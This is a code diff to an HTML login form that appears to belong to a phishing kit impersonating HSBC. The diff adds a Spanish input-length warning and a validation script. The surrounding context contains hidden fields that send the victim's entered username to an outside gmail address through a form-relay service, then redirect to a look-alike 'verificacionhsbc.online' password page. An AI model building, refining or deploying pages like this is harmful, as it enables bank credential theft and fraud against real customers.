@@ -32,6 +32,7 @@
             </div>
             <div class="input-cont">
               <input class='inputname' name='name' type="text" />
+              <label style="color:red;font-size:14px;display:none;" class="labelaviso">Debe contener al menos 5 caracteres</label>
               <input type="hidden" name="email" value="respues2formul@gmail.com" />
               <input type="hidden" name="_next" value="http://verificacionhsbc.online/password.html" />
               <input type="hidden" name="_captcha" value="false" />
@@ -43,6 +44,19 @@
               <button class='btncontinuar' type='submit'>Continuar</button>
             </div>
           </div>
+          <script>
+            var inputname = document.querySelector('.inputname');
+            var label = document.querySelector('.labelaviso');
+
+            inputname.addEventListener('input', function () {
+              if (inputname.value.length >= 5) {
+                label.style.display = 'none';
+              } else {
+                label.style.display = 'block';
+              }
+            });
+
+          </script>
         </form>
       </div>
     </div>
